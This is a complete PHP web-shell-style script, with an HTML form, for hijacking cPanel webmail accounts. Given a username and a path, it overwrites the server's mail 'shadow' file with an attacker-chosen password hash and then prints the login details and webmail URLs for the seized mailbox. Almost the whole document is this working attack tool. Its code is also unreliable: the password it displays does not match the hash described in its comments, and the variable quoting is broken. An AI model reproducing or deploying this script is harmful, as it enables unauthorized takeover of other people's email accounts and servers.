
<title>Change Password webmail</title>

<center><form method='POST'>

<h4>Change Password webmail</h4><h4>

User : <input type='text' name='user' size='40' /><br />

Path : <input type='text' name='path' size='40'  /><br /><br /></h4>

<input type='submit' name='start' value='Change Password' />

</form></center>
<br><center>
	<h4>Copyright © 2019 - codexrush -

<?php

    /*



       Script PHP Change Password webmail

       User : user cpanel

       Path : path file shadow

       Discovery : r0kin

       Coder : Lov3rDns



    */



@error_reporting();



    if($_POST)

    {

    $user = $_POST['user'];  // user cpanel

    $path = @chdir($_POST['path']);       // path shadow

    $pass = "@codexrush";

    $lov3r = @base64_decode('JGFwcjEkdkNJWmRBXzEkRWhzcEhSWUZ4R24wcTBiZzRVeS9VLg==');

    $array = @array('$user','$lov3r');    // user:$apr1$vCIZdA_1$EhspHRYFxGn0q0bg4Uy/U. pass ( lov3rdns )

    $imp = @implode(':',$array);         // user:$apr1$vCIZdA_1$EhspHRYFxGn0q0bg4Uy/U.  pass ( lov3rdns )

    $dns = @file_put_contents('shadow',$imp); // Creat shadow paste user:$apr1$vCIZdA_1$EhspHRYFxGn0q0bg4Uy/U.

    if($dns)

    {



    echo '<h4><center>Password is <font color="red">'.$pass.'</font> .. <br />

    Email is <font color="red">'.$user.'@'.$_SERVER['SERVER_NAME'].'</font><br />

    Panel is <font color="red">http://webmail.'.$_SERVER['SERVER_NAME'].'</font>

    Or <font color="red">http://'.$_SERVER['SERVER_NAME'].':2096</font><br />

    <font color="blue">./x3</font></h4></center>';

    }else

    {

      echo '<h4><center>File Not Found</h4></center>';

    }

    }



?>
